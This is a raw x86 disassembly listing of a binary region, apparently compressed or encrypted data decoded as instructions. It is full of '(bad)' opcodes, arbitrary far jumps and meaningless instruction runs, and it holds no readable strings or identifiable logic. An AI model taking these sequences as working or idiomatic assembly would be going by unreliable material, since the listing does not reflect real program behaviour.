  41a17b:	mov    esi,0x6745d450
  41a180:	lods   eax,DWORD PTR ds:[esi]
  41a181:	pop    esp
  41a182:	push   esi
  41a183:	lods   al,BYTE PTR ds:[esi]
  41a184:	(bad)  
  41a186:	fst    DWORD PTR [esi-0x22]
  41a189:	jns    0x41a1f7
  41a18b:	stc    
  41a18c:	(bad)  
  41a18d:	out    dx,al
  41a18e:	pushf  
  41a18f:	add    DWORD PTR [eax],0x0
	...
  41a1f2:	add    BYTE PTR [eax],al
  41a1f4:	sbb    al,0xc
  41a1f6:	std    
  41a1f7:	sbb    ebp,edi
  41a1f9:	stc    
  41a1fa:	cld    
  41a1fb:	or     eax,0x398d6850
  41a200:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a201:	jp     0x41a273
  41a203:	js     0x41a1e9
  41a205:	adc    al,0x1
  41a207:	add    BYTE PTR [ecx+eax*1],al
  41a20a:	add    BYTE PTR [eax],al
  41a20c:	jo     0x41a1c3
  41a20e:	jp     0x41a1fb
  41a210:	neg    BYTE PTR [edi]
  41a212:	mov    esi,0xe2cd85b
  41a217:	mov    esi,es
  41a219:	scas   eax,DWORD PTR es:[edi]
  41a21a:	mov    dl,0xd6
  41a21c:	xchg   DWORD PTR [esi],ebp
  41a21e:	and    DWORD PTR [edi-0xc],0x43
  41a222:	mov    DWORD PTR [ebx+0x32c6fdff],0x72bdc404
  41a22c:	add    al,0xaf
  41a22e:	pop    ss
  41a22f:	icebp  
  41a230:	outs   dx,DWORD PTR ds:[esi]
  41a231:	adc    al,0x33
  41a233:	mov    dh,0xe7
  41a235:	add    ecx,DWORD PTR [edx+0x49]
  41a238:	mov    al,0xf
  41a23a:	cmp    DWORD PTR [ebx+0x76],ebx
  41a23d:	loopne 0x41a1ea
  41a23f:	loop   0x41a217
  41a241:	cmp    ecx,DWORD PTR [eax+0x6a]
  41a244:	stos   BYTE PTR es:[edi],al
  41a245:	ss xor eax,0x8d07b33a
  41a24b:	cmp    al,BYTE PTR [ecx]
  41a24d:	mov    al,ds:0x30f2cd13
  41a252:	(bad)
  41a257:	and    DWORD PTR [ecx-0x19],ecx
  41a25a:	jg     0x41a241
  41a25c:	mov    dl,0x4e
  41a25e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a25f:	mov    dh,0x45
  41a261:	and    ecx,DWORD PTR [ebx+0x24]
  41a264:	in     al,0x93
  41a266:	pop    ds
  41a267:	xchg   DWORD PTR [edx+eiz*8],esi
  41a26a:	fisubr WORD PTR [esi]
  41a26c:	or     edx,0xffffffbc
  41a26f:	cmp    ebp,DWORD PTR [esi]
  41a271:	push   ss
  41a272:	sbb    esi,DWORD PTR [ecx]
  41a274:	xchg   esi,eax
  41a275:	arpl   WORD PTR [eax+0x2ee70a13],cx
  41a27b:	mov    ds:0x9bba3eef,eax
  41a280:	xor    edi,DWORD PTR ds:0x9c68a7e1
  41a286:	pop    ds
  41a287:	push   edi
  41a288:	out    dx,al
  41a289:	jecxz  0x41a290
  41a28b:	(bad)  
  41a28c:	jno    0x41a2bc
  41a28e:	shr    DWORD PTR [eax+0x30c1aef3],cl
  41a294:	xor    DWORD PTR [ecx],esi
  41a296:	mov    eax,0x585e6aff
  41a29b:	lds    ebx,FWORD PTR [eax]
  41a29d:	retf   
  41a29e:	ins    DWORD PTR es:[edi],dx
  41a29f:	ret    
  41a2a0:	xor    ch,bl
  41a2a2:	aam    0xf
  41a2a4:	push   edi
  41a2a5:	cdq    
  41a2a6:	or     al,0xda
  41a2a8:	es das 
  41a2aa:	add    bl,ch
  41a2ac:	mov    ah,0xcb
  41a2ae:	inc    ecx
  41a2af:	popf   
  41a2b0:	mov    dh,0x32
  41a2b2:	rcl    DWORD PTR [edx+0x1543100b],cl
  41a2b8:	pop    ebp
  41a2b9:	std    
  41a2ba:	shr    DWORD PTR [ecx],0x6a
  41a2bd:	sub    ax,si
  41a2c0:	(bad)  
  41a2c1:	xlat   BYTE PTR ds:[ebx]
  41a2c2:	retf   
  41a2c3:	pop    ss
  41a2c4:	jns    0x41a2e6
  41a2c6:	mov    bh,0x25
  41a2c8:	mov    ah,0x90
  41a2ca:	mov    ebx,0xadd096b1
  41a2cf:	mov    ?,WORD PTR [esi-0x1f]
  41a2d2:	jne    0x41a336
  41a2d4:	cwde   
  41a2d5:	xchg   DWORD PTR [edx],ebp
  41a2d7:	fwait
  41a2d8:	lock in eax,dx
  41a2da:	cli    
  41a2db:	jle    0x41a333
  41a2dd:	test   eax,0x819457df
  41a2e2:	inc    edx
  41a2e3:	inc    esp
  41a2e4:	es sbb al,0x88
  41a2e7:	jl     0x41a282
  41a2e9:	inc    esp
  41a2ea:	jg     0x41a2c1
  41a2ec:	fistp  WORD PTR [esi+esi*4]
  41a2ef:	aaa    
  41a2f0:	pop    edi
  41a2f1:	mov    ecx,0xe51d91e5
  41a2f6:	(bad)  
  41a2f7:	jne    0x41a378
  41a2f9:	jle    0x41a34d
  41a2fb:	pop    edx
  41a2fc:	mov    ebx,0x38a99e2d
  41a301:	lods   al,BYTE PTR ds:[esi]
  41a302:	mov    cl,0x45
  41a304:	dec    esi
  41a305:	xchg   eax,ebp
  41a307:	in     al,dx
  41a308:	mov    eax,0x80114e4d
  41a30d:	into   
  41a30e:	lds    esi,FWORD PTR [ecx+0x0]
	...
  41a371:	add    BYTE PTR [eax],al
  41a373:	add    bh,dh
  41a375:	pop    eax
  41a376:	test   al,0x13
  41a378:	scas   eax,DWORD PTR es:[edi]
  41a379:	repz (bad) 
  41a37b:	cld    
  41a37c:	adc    eax,0x44a6955c
  41a381:	mov    cl,0x20
  41a383:	loop   0x41a36d
  41a385:	adc    eax,0x1040001
  41a38a:	add    BYTE PTR [eax],al
  41a38c:	sub    BYTE PTR [ebx-0x4633503b],0xdc
  41a393:	lds    bp,DWORD PTR [edi-0x54]
  41a397:	jmp    0x75d4:0xba783b9
  41a39e:	sar    BYTE PTR [edi+0x64],0x2c
  41a3a2:	sub    cl,BYTE PTR [ecx+0x55]
  41a3a5:	into   
  41a3a6:	outs   dx,DWORD PTR ds:[esi]
  41a3a7:	xchg   ebp,eax
  41a3a8:	sahf   
  41a3a9:	push   es
  41a3aa:	xchg   edi,eax
  41a3ab:	out    dx,eax
  41a3ac:	pusha  
  41a3ad:	(bad)  
  41a3ae:	sub    ch,cl
  41a3b0:	cli    
  41a3b1:	dec    esi
  41a3b2:	ja     0x41a3be
  41a3b4:	dec    edi
  41a3b5:	xchg   edi,eax
  41a3b6:	inc    eax
  41a3b7:	rcr    al,1
  41a3b9:	jge    0x41a383
  41a3bb:	xchg   BYTE PTR [edi],dh
  41a3bd:	mov    cl,0xdd
  41a3bf:	push   ebp
  41a3c0:	cli    
  41a3c1:	aam    0x90
  41a3c3:	lea    ebp,[ecx+0x46c9b581]
  41a3c9:	nop
  41a3ca:	push   es
  41a3cb:	jno    0x41a40b
  41a3cd:	mov    bh,0xd9
  41a3cf:	loopne 0x41a36e
  41a3d1:	dec    edx
  41a3d2:	pushf  
  41a3d3:	(bad)  
  41a3d4:	cmc    
  41a3d5:	into   
  41a3d6:	(bad)  
  41a3d7:	push   ecx
  41a3d8:	sbb    DWORD PTR [edx],edx
  41a3da:	xchg   DWORD PTR [edx],ebp
  41a3dc:	cmp    BYTE PTR [edx+0x11],dh
  41a3df:	int3   
  41a3e0:	cld    
  41a3e1:	mov    cl,0x3a
  41a3e3:	xchg   BYTE PTR [esi],cl
  41a3e5:	test   BYTE PTR [edi],0x48
  41a3e8:	mov    eax,ds:0xaf810b42
  41a3ed:	test   DWORD PTR [esi+0x67ee88c5],edi
  41a3f3:	push   ss
  41a3f4:	cmp    DWORD PTR [ecx],esi
  41a3f6:	pop    ds
  41a3f7:	jae    0x41a3d4
  41a3f9:	adc    DWORD PTR [esi-0x4b3b30e],ebx
  41a3ff:	mov    cl,0x69
  41a401:	xor    eax,edi
  41a403:	adc    ecx,esp
  41a405:	fidivr DWORD PTR [ecx+0x30]
  41a408:	dec    esp
  41a409:	inc    esp
  41a40a:	add    BYTE PTR [edi],ch
  41a40c:	jecxz  0x41a45c
  41a40e:	cmp    DWORD PTR [ecx],ebp
  41a410:	loope  0x41a41c
  41a412:	fcomp  DWORD PTR [esi]
  41a414:	sbb    dh,BYTE PTR [esi+esi*1-0x4c]
  41a418:	pop    edi
  41a419:	ds enter 0xd025,0x26
  41a41e:	cmp    dl,dl
  41a420:	xchg   edx,eax
  41a421:	xchg   edx,eax
  41a422:	fcomp  st(5)
  41a424:	fs or  eax,0xc25d17d7
  41a42a:	or     dl,0xa2
  41a42d:	xchg   ebp,eax
  41a42e:	fldenv [ecx+0x60ab7faa]
  41a434:	push   ebx
  41a435:	mov    ch,0x21
  41a437:	mov    edx,0x570542d2
  41a43c:	fcmovne st,st(6)
  41a43e:	mov    ebp,0x1c83ae5e
  41a443:	nop
  41a444:	(bad)  ds:0x5871869d
  41a44a:	sub    cl,BYTE PTR [eiz*1-0x464e148b]
  41a451:	sti    
  41a452:	inc    edi
  41a453:	lea    edx,[ebp+0x275238a8]
  41a459:	cmp    esp,esi
  41a45b:	gs sti 
  41a45d:	(bad)  
  41a45f:	int3   
  41a460:	cmp    eax,0xffcc8d09
  41a465:	or     DWORD PTR [edx-0x12e002ef],edi
  41a46b:	dec    ebx
  41a46c:	sbb    al,BYTE PTR [ecx-0x36e1b6ef]
  41a472:	js     0x41a467
  41a474:	adc    DWORD PTR [esi],esi
  41a476:	and    bl,BYTE PTR [ecx]
  41a478:	and    esp,DWORD PTR [esi]
  41a47a:	fs jb  0x41a489
  41a47d:	push   ds
  41a47e:	mov    ds:0x3be69006,al
  41a483:	jae    0x41a4b7
  41a485:	sub    al,0xdc
  41a487:	xchg   edx,eax
  41a488:	das    
  41a489:	in     al,dx
  41a48a:	inc    eax
  41a48b:	fucomi st,st(2)
  41a48d:	pop    esp
  41a48e:	dec    esi
  41a48f:	int3   
	...
  41a4f4:	mov    edi,0xff0fcf82
  41a4f9:	dec    edi
  41a4fa:	push   DWORD PTR [edx+0x5f4d0d09]
  41a500:	inc    edi
  41a501:	inc    ebp
  41a502:	adc    esi,ebp
  41a504:	in     al,dx
  41a505:	push   ss
  41a506:	add    DWORD PTR [eax],eax
  41a508:	add    al,0x1
  41a50a:	add    BYTE PTR [eax],al
  41a50c:	push   es
  41a50d:	and    al,0xfb
  41a50f:	stc    
  41a510:	retf   0x8d31
  41a513:	clc    
  41a514:	(bad)  
  41a515:	mov    ah,0x59
  41a517:	dec    edx
  41a518:	iret   
  41a519:	and    al,0x86
  41a51b:	div    BYTE PTR [ecx+0x69b8f0c4]
  41a521:	fldcw  WORD PTR [ebx+0x58fe8d8d]
  41a527:	jnp    0x41a4e8
  41a529:	ret    
  41a52a:	mov    ch,0xb9
  41a52c:	(bad)  
  41a52d:	and    eax,0x45a4de1e
  41a532:	adc    eax,0x56e102c8
  41a537:	pop    ebp
  41a538:	fs sub eax,0xf0becd4e
  41a53e:	jle    0x41a50d
  41a540:	test   BYTE PTR [edi-0x9],0x69
  41a544:	out    dx,eax
  41a545:	or     bh,BYTE PTR [edx]
  41a547:	sub    DWORD PTR [edi-0x5e],edi
  41a54a:	xor    ebp,DWORD PTR [ecx]
  41a54c:	dec    ebp
  41a54d:	push   0xffffffad
  41a54f:	neg    DWORD PTR [edi+0x35]
  41a552:	sbb    al,0x49
  41a554:	inc    eax
  41a555:	loopne 0x41a54b
  41a557:	(bad)  
  41a558:	dec    ecx
  41a559:	mov    eax,ds:0xeb499686
  41a55e:	rol    BYTE PTR [ebp+0x6cc593d],cl
  41a564:	jns    0x41a533
  41a566:	sub    ecx,DWORD PTR [ecx-0x29]
  41a569:	mov    bl,0x18
  41a56b:	bound  ebx,QWORD PTR [edx-0x67]
  41a56e:	out    dx,al
  41a56f:	jo     0x41a5ec
  41a571:	jmp    0xabd7:0x257979c4
  41a578:	stos   BYTE PTR es:[edi],al
  41a579:	jne    0x41a53d
  41a57b:	out    dx,eax
  41a57c:	aas    
  41a57d:	mov    cl,0x1f
  41a57f:	loope  0x41a57f
  41a581:	aad    0x44
  41a583:	or     DWORD PTR [ebp+0x41bf561b],ebp
  41a589:	fcomp  QWORD PTR [ebx-0x595dcf9f]
  41a58f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a590:	mov    ebx,ds
  41a592:	out    dx,eax
  41a593:	xor    eax,0xab597b86
  41a598:	div    ah
  41a59a:	sub    al,0xc2
  41a59c:	adc    DWORD PTR [edx],esp
  41a59e:	inc    ebx
  41a59f:	outs   dx,DWORD PTR ds:[esi]
  41a5a0:	mov    esp,0x33d4805a
  41a5a5:	xor    BYTE PTR [edi+0x20],dh
  41a5a8:	lock test BYTE PTR [eax-0x14],dh
  41a5ac:	iret   
  41a5ad:	imul   ebx,DWORD PTR [edi+0x48],0x2dabb1cf
  41a5b4:	xchg   ebp,eax
  41a5b5:	ret    0x860c
  41a5b8:	xchg   ebx,eax
  41a5b9:	aas    
  41a5ba:	aam    0x97
  41a5bc:	enter  0x673c,0x80
  41a5c0:	add    dh,ch
  41a5c2:	mov    ds:0x107f66dd,al
  41a5c7:	adc    ebx,DWORD PTR [ecx+ebx*2]
  41a5ca:	mov    WORD PTR [ecx-0x43381909],?
  41a5d0:	xchg   edi,eax
  41a5d1:	dec    ecx
  41a5d2:	mov    ch,0x35
  41a5d4:	cmp    DWORD PTR [edx+0x180ca6d8],edi
  41a5da:	std    
  41a5db:	mov    dh,0xea
  41a5dd:	sub    al,0xf5
  41a5df:	xchg   esp,eax
  41a5e0:	push   es
  41a5e1:	adc    BYTE PTR [ebp+0x1eba8d63],cl
  41a5e7:	add    BYTE PTR [edi-0x5],0x9
  41a5eb:	push   ecx
  41a5ec:	dec    edi
  41a5ed:	or     eax,0xd6cf7dfe
  41a5f2:	jmp    0x3eea:0xac2364f1
  41a5f9:	mov    dh,0x4c
  41a5fb:	or     DWORD PTR [edx-0x6d],edx
  41a5fe:	xchg   esp,eax
  41a5ff:	sbb    al,0x7f
  41a601:	xor    eax,0x2f92b11a
  41a606:	lods   eax,DWORD PTR ds:[esi]
  41a607:	adc    eax,0x1071f88f
  41a60c:	cwde   
  41a60d:	jg     0x41a612
  41a60f:	jp     0x41a611
	...
  41a671:	add    BYTE PTR [eax],al
  41a673:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41a677:	inc    ecx
  41a678:	ja     0x41a6e5
  41a67a:	pop    esp
  41a67b:	aas    
  41a67c:	dec    ecx
  41a67d:	push   0x2371a625
  41a682:	xchg   BYTE PTR [eax+esi*8+0x17],dl
  41a686:	add    DWORD PTR [eax],eax
  41a688:	add    al,0x1
  41a68a:	add    BYTE PTR [eax],al
  41a68c:	pop    eax
  41a68d:	movaps xmm7,xmm0
  41a690:	rcl    BYTE PTR [esi+0x48ac98cc],1
  41a696:	pop    ecx
  41a697:	push   esp
  41a698:	outs   dx,BYTE PTR ds:[esi]
  41a699:	lea    esi,[ecx+0x2b005b41]
  41a69f:	xchg   BYTE PTR [esp+eiz*2-0x48],ch
  41a6a3:	mov    ds,WORD PTR [edx+edx*8-0x75]
  41a6a7:	add    DWORD PTR [esi],ebp
  41a6a9:	push   es
  41a6aa:	xchg   edi,eax
  41a6ab:	jge    0x41a65b
  41a6ad:	fild   WORD PTR [edi+0x3c]
  41a6b0:	pmullw mm3,QWORD PTR [eax-0x6121f69b]
  41a6b7:	sahf   
  41a6b8:	data16 bnd jl 0x41a689
  41a6bc:	or     al,0x18
  41a6be:	hlt    
  41a6bf:	xor    al,0xb5
  41a6c1:	xor    al,dh
  41a6c3:	mov    DWORD PTR [esi],ecx
  41a6c5:	push   cs
  41a6c6:	rcr    BYTE PTR [esi+0x17],cl
  41a6c9:	fcomp  QWORD PTR [edi-0x1162946b]
  41a6cf:	cmp    DWORD PTR [edi+eiz*4+0x29b92cba],0xaff15e22
  41a6da:	fwait
  41a6db:	mov    bh,0x4c
  41a6dd:	mov    al,ds:0xdf8fc097
  41a6e2:	and    al,0x9f
  41a6e4:	scas   al,BYTE PTR es:[edi]
  41a6e5:	or     al,0xeb
  41a6e7:	push   eax
  41a6e8:	ins    DWORD PTR es:[edi],dx
  41a6e9:	dec    ecx
  41a6ea:	sbb    BYTE PTR [ecx-0x695c4bc7],dl
  41a6f0:	stc    
  41a6f1:	lea    ebp,[ebp-0x21ff96ec]
  41a6f7:	and    eax,0x7b542a1a
  41a6fc:	(bad)  
  41a6fd:	sub    eax,0x5ac7e061
  41a702:	mov    ch,0x64
  41a704:	dec    edi
  41a705:	xchg   esp,eax
  41a706:	mov    al,ds:0x4bfafb4c
  41a70b:	shl    ebp,0xf
  41a70e:	jl     0x41a788
  41a710:	push   cs
  41a711:	jae    0x41a6f5
  41a713:	add    edx,DWORD PTR [esi+0x436663f3]
  41a719:	cli    
  41a71a:	ja     0x41a6ed
  41a71c:	xlat   BYTE PTR ds:[ebx]
  41a71d:	(bad)
  41a721:	and    BYTE PTR [esi+0x3bea6d3c],cl
  41a727:	add    dl,al
  41a729:	xor    al,0xb9
  41a72b:	int    0x33
  41a72d:	cmp    DWORD PTR [edx+ebx*8],esi
  41a730:	jge    0x41a765
  41a732:	dec    eax
  41a733:	call   0xf98f:0x69a34efb
  41a73a:	cwde   
  41a73b:	cmp    DWORD PTR [eax],eax
  41a73d:	or     ebx,DWORD PTR [edi+0x44]
  41a740:	mov    ah,0xed
  41a742:	and    al,cl
  41a744:	(bad)  
  41a745:	iret   
  41a746:	out    dx,eax
  41a747:	sub    dh,BYTE PTR [ebp-0x69472570]
  41a74d:	mov    cl,0x75
  41a74f:	sub    al,0xb9
  41a751:	and    al,0x78
  41a753:	pusha  
  41a754:	rcl    DWORD PTR [esi],0xe0
  41a757:	or     ecx,edx
  41a759:	mov    edx,0xc57ed01e
  41a75e:	xchg   ecx,eax
  41a75f:	out    dx,eax
  41a760:	jae    0x41a7d1
  41a762:	jl     0x41a6f5
  41a764:	fwait
  41a765:	dec    esi
  41a766:	pop    esp
  41a767:	mov    esi,DWORD PTR [ebx+0x59]
  41a76a:	(bad)  
  41a76b:	xor    DWORD PTR [ebx+eiz*8-0x30],ecx
  41a76f:	dec    ecx
  41a770:	dec    edx
  41a771:	out    0x7e,eax
  41a773:	cld    
  41a774:	sbb    esp,ecx
  41a776:	popa   
  41a777:	jnp    0x41a771
  41a779:	(bad)  
  41a77a:	fadd   st,st(7)
  41a77c:	fsubr  st(0),st
  41a77e:	int3   
  41a77f:	(bad)  
  41a780:	call   0xc624:0xde4a2cbe
  41a787:	mov    al,BYTE PTR [ebx-0x77]
  41a78a:	hlt    
  41a78b:	jecxz  0x41a762
  41a78d:	out    dx,al
  41a78e:	mov    ds:0xde,al
	...
  41a7f3:	add    bl,dh
  41a7f5:	xchg   edi,eax
  41a7f6:	jae    0x41a77f
  41a7f8:	ja     0x41a7e1
  41a7fa:	div    edi
  41a7fc:	mov    ds:0xe05327ca,al
  41a801:	jne    0x41a80d
  41a803:	clc    
  41a804:	hlt    
  41a805:	sbb    BYTE PTR [ecx],al
  41a807:	add    BYTE PTR [ecx+eax*1],al
  41a80a:	add    BYTE PTR [eax],al
  41a80c:	ret    
  41a80d:	out    0xd4,al
  41a80f:	mov    bl,0x6
  41a811:	mov    esi,0x27a669fc
  41a816:	inc    BYTE PTR [edi]
  41a818:	push   eax
  41a819:	lock fdivr DWORD PTR [ecx+edi*4+0x77]
  41a81e:	sub    BYTE PTR [esp+ecx*1+0xd],cl
  41a822:	jae    0x41a7d8
  41a824:	(bad)  
  41a825:	sbb    BYTE PTR [eax],dh
  41a827:	jg     0x41a87f
  41a829:	data16 arpl WORD PTR [eax],di
  41a82c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a82d:	mov    ebp,0xec50f69e
  41a832:	sbb    DWORD PTR [edi],ecx
  41a834:	outs   dx,DWORD PTR ds:[esi]
  41a835:	ret    
  41a836:	pop    edi
  41a837:	fist   WORD PTR [ebx]
  41a839:	in     al,dx
  41a83a:	or     cl,BYTE PTR [eax+0x15eec958]
  41a840:	or     edi,DWORD PTR [edx-0x78]
  41a843:	fbld   TBYTE PTR [eax]
  41a845:	add    al,0x88
  41a847:	imul   eax,ebp,0x21
  41a84a:	loopne 0x41a81f
  41a84c:	(bad)  
  41a84d:	pop    esp
  41a84e:	and    DWORD PTR [edi+ecx*2],edx
  41a851:	sar    BYTE PTR [esi+0x7c],0x30
  41a855:	xchg   esp,eax
  41a856:	add    BYTE PTR [ecx-0x37],ah
  41a859:	inc    ecx
  41a85a:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41a85c:	inc    eax
  41a85d:	jb     0x41a848
  41a85f:	xor    esi,DWORD PTR [ecx]
  41a861:	ja     0x41a8bf
  41a863:	push   0x33c6f727
  41a868:	jg     0x41a8b0
  41a86a:	push   edi
  41a86b:	imul   eax,DWORD PTR [esi],0x63
  41a86e:	jecxz  0x41a80d
  41a870:	add    eax,0xe9797754
  41a875:	aas    
  41a876:	mov    eax,ds:0x1147dd4d
  41a87b:	fadd   DWORD PTR [esi+0x726e8e64]
  41a881:	enter  0xd50e,0xcb
  41a885:	fwait
  41a886:	pop    ebp
  41a887:	mov    bh,0xa9
  41a889:	mov    al,ds:0xf85ccff8
  41a88e:	sbb    bl,bl
  41a890:	xchg   edx,eax
  41a891:	push   eax
  41a892:	or     BYTE PTR [ecx-0x52cbf69b],bh
  41a898:	cmp    al,0xa1
  41a89a:	push   ss
  41a89b:	inc    ecx
  41a89c:	fild   QWORD PTR [bx+di]
  41a89f:	add    ebp,DWORD PTR [edx+0x43]
  41a8a2:	jnp    0x41a917
  41a8a4:	pop    ss
  41a8a5:	enter  0x4bea,0x4b
  41a8a9:	jle    0x41a8ec
  41a8ab:	and    BYTE PTR [eax+0x6f],dl
  41a8ae:	test   eax,0xec23338d
  41a8b3:	ja     0x41a8cd
  41a8b5:	mov    ds:0xa0acddc6,eax
  41a8ba:	dec    esi
  41a8bb:	mov    eax,0xf36b5bf
  41a8c0:	out    0xf6,al
  41a8c2:	xchg   ebp,eax
  41a8c3:	pop    es
  41a8c4:	dec    esp
  41a8c5:	icebp  
  41a8c6:	idiv   BYTE PTR [ebx]
  41a8c8:	js     0x41a8db
  41a8ca:	sub    ebx,ecx
  41a8cc:	pop    edi
  41a8cd:	jge    0x41a86c
  41a8cf:	daa    
  41a8d0:	cmp    al,0xc
  41a8d2:	push   esi
  41a8d3:	outs   dx,BYTE PTR ds:[esi]
  41a8d4:	icebp  
  41a8d5:	push   ebp
  41a8d6:	test   BYTE PTR [eax],cl
  41a8d8:	or     al,0x34
  41a8da:	lea    edi,[edx]
  41a8dc:	mov    dh,0xd3
  41a8de:	add    DWORD PTR [esi+0x15],ecx
  41a8e1:	xor    al,0x98
  41a8e3:	pmulhuw mm3,mm7
  41a8e6:	iret   
  41a8e7:	(bad)  
  41a8e9:	gs fs and al,0xc1
  41a8ed:	in     eax,0xb6
  41a8ef:	add    DWORD PTR [ebx+0x1],edx
  41a8f2:	jns    0x41a96c
  41a8f4:	or     al,0xaa
  41a8f6:	dec    ebx
  41a8f7:	or     al,0xc8
  41a8f9:	sub    al,0xc
  41a8fb:	ins    DWORD PTR es:[edi],dx
  41a8fc:	repz cmp ch,ah
  41a8ff:	aad    0xa0
  41a901:	hlt    
  41a902:	addr16 add bl,ch
  41a905:	sub    DWORD PTR [esi],0x8a714746
  41a90b:	dec    edx
  41a90c:	in     eax,dx
  41a90d:	mov    ebx,0x2a7b
	...
  41a972:	add    BYTE PTR [eax],al
  41a974:	xor    eax,0xcf4a867e
  41a979:	cli    
  41a97a:	std    
  41a97b:	jg     0x41a9cb
  41a97d:	push   edx
  41a97e:	pushf  
  41a97f:	dec    esp
  41a980:	pop    es
  41a981:	or     dh,BYTE PTR [edx+0x119f82b]
  41a987:	add    BYTE PTR [ecx+eax*1],al
  41a98a:	add    BYTE PTR [eax],al
  41a98c:	mov    eax,ds:0x850247ec
  41a991:	stos   BYTE PTR es:[edi],al
  41a992:	dec    edi
  41a993:	in     eax,dx
  41a994:	cwde   
  41a995:	mov    esp,DWORD PTR [ebp+0x63]
  41a998:	xor    cl,ah
  41a99a:	and    edi,DWORD PTR [edx]
  41a99c:	add    ebp,DWORD PTR [edi-0x37ca2dd2]
  41a9a2:	(bad)  
  41a9a4:	inc    ebx
  41a9a5:	repz pop esi
  41a9a7:	jp     0x41a98e
  41a9a9:	mov    esi,DWORD PTR [di+0x604f]
  41a9ae:	or     ebp,ecx
  41a9b0:	xchg   ebx,eax
  41a9b1:	int3   
  41a9b2:	mov    ds:0xe3cfd794,eax
  41a9b8:	mov    edi,0xab799f8d
  41a9bd:	test   ecx,ebp
  41a9bf:	mov    ch,0xe3
  41a9c1:	xor    ch,BYTE PTR [ecx+0x6488de8d]
  41a9c7:	pop    edx
  41a9c8:	cs (bad) 
  41a9ca:	aam    0x9
  41a9cc:	push   es
  41a9cd:	aaa    
  41a9ce:	out    dx,eax
  41a9cf:	mov    edx,0xc7ef0ce0
  41a9d4:	pushf  
  41a9d5:	push   ebp
  41a9d6:	jns    0x41aa41
  41a9d8:	imul   ecx,DWORD PTR [ecx+0x7d],0xb2294680
  41a9df:	aad    0xd4
  41a9e1:	xchg   edx,eax
  41a9e2:	(bad)
  41a9e5:	inc    ebp
  41a9e6:	sbb    ebx,DWORD PTR [esi-0x42]
  41a9e9:	xchg   esp,eax
  41a9ea:	ja     0x41a9e5
  41a9ec:	jge    0x41a9f8
  41a9ee:	shl    BYTE PTR [ecx+0x31],0x54
  41a9f2:	push   ds
  41a9f3:	loop   0x41a9f1
  41a9f5:	or     eax,0xaef83ef1
  41a9fa:	push   ebx
  41a9fb:	push   0x6b
  41a9fd:	imul   ebx,DWORD PTR [eax+0x151d6b44],0xffffff9d
  41aa04:	arpl   WORD PTR [edx+0x1e650d14],ax
  41aa0a:	cmp    BYTE PTR [eax+0x32],dl
  41aa0d:	pop    edi
  41aa0e:	test   eax,0x2dbc881e
  41aa13:	sar    dl,1
  41aa15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa16:	inc    esp
  41aa17:	arpl   WORD PTR [edx-0x67],di
  41aa1a:	mov    ecx,DWORD PTR [ecx-0x48d3a581]
  41aa20:	jbe    0x41aa38
  41aa22:	ret    
  41aa23:	popf   
  41aa24:	neg    BYTE PTR cs:0x4dca275c
  41aa2b:	push   es
  41aa2c:	inc    ebx
  41aa2d:	test   eax,0xeef5259f
  41aa32:	jns    0x41aa90
  41aa34:	pop    ds
  41aa35:	addps  xmm6,xmm4
  41aa38:	pusha  
  41aa39:	mov    WORD PTR [edi],?
  41aa3b:	xchg   ebp,eax
  41aa3c:	adc    DWORD PTR [esi-0x4ad27016],ebp
  41aa42:	mov    eax,ds:0x625227be
  41aa47:	cli    
  41aa48:	push   esp
  41aa49:	push   ds
  41aa4a:	mov    ebx,0xc852c31b
  41aa4f:	jne    0x41aa22
  41aa51:	inc    ecx
  41aa52:	int3   
  41aa53:	ja     0x41aa78
  41aa55:	test   BYTE PTR [ebx],dl
  41aa57:	pop    esi
  41aa58:	add    BYTE PTR [ebx+0x52e45f02],0x85
  41aa5f:	fwait
  41aa60:	adc    eax,esi
  41aa62:	inc    ecx
  41aa63:	dec    ecx
  41aa64:	jnp    0x41aa26
  41aa66:	stos   DWORD PTR es:[edi],eax
  41aa67:	rcr    esi,0xbb
  41aa6a:	mov    ah,0xab
  41aa6c:	nop
  41aa6d:	enter  0x5b4a,0x2b
  41aa71:	ja     0x41aa59
  41aa73:	hlt    
  41aa74:	aam    0x5c
  41aa76:	push   ecx
  41aa77:	jnp    0x41aaf0
  41aa79:	dec    ebp
  41aa7a:	sub    eax,0x6d662320
  41aa7f:	mov    ds:0xf99c4c10,eax
  41aa84:	fcomp  DWORD PTR [eax+eiz*2]
  41aa87:	fbld   TBYTE PTR [edi*8-0x8bb3505]
  41aa8e:	mov    ds:0x52,eax
	...
  41aaf3:	add    bh,dh
  41aaf5:	add    esp,ebx
  41aaf7:	mov    ah,0xfe
  41aaf9:	std    
  41aafa:	inc    DWORD PTR [ebx+0x5f]
  41aafd:	sbb    BYTE PTR [esi+0x43],ah
  41ab00:	cli    
  41ab01:	or     ebp,eax
  41ab03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab04:	cld    
  41ab05:	sbb    al,BYTE PTR [ecx]
  41ab07:	add    BYTE PTR [ecx+eax*1],al
  41ab0a:	add    BYTE PTR [eax],al
  41ab0c:	pop    esp
  41ab0d:	inc    ecx
  41ab0e:	xor    al,0xf8
  41ab10:	adc    eax,0xf56d0f6b
  41ab15:	(bad)  
  41ab16:	shl    eax,cl
  41ab18:	(bad)  [eax]
  41ab1a:	aas    
  41ab1b:	pop    eax
  41ab1c:	cdq    
  41ab1d:	scas   al,BYTE PTR es:[edi]
  41ab1e:	lods   eax,DWORD PTR ds:[esi]
  41ab1f:	loope  0x41ab06
  41ab21:	jnp    0x41ab42
  41ab23:	push   ds
  41ab24:	pop    ebp
  41ab25:	stc    
  41ab26:	pop    ebp
  41ab27:	cld    
  41ab28:	mov    ecx,0x4760f15e
  41ab2d:	nop
  41ab2e:	daa    
  41ab2f:	xchg   BYTE PTR [ebx+0x21aba0e3],cl
  41ab35:	xor    BYTE PTR [eax+0x3d4f5be9],al
  41ab3b:	xchg   ebx,eax
  41ab3c:	mov    ebx,0x80c918b
  41ab41:	or     dl,BYTE PTR [eax]
  41ab43:	xor    eax,0xb71d3669
  41ab48:	adc    al,0xf2
  41ab4a:	data16 sub ch,BYTE PTR [ebp+0x10]
  41ab4e:	add    al,0xd8
  41ab50:	stc    
  41ab51:	mov    edx,0x3e36a7ea
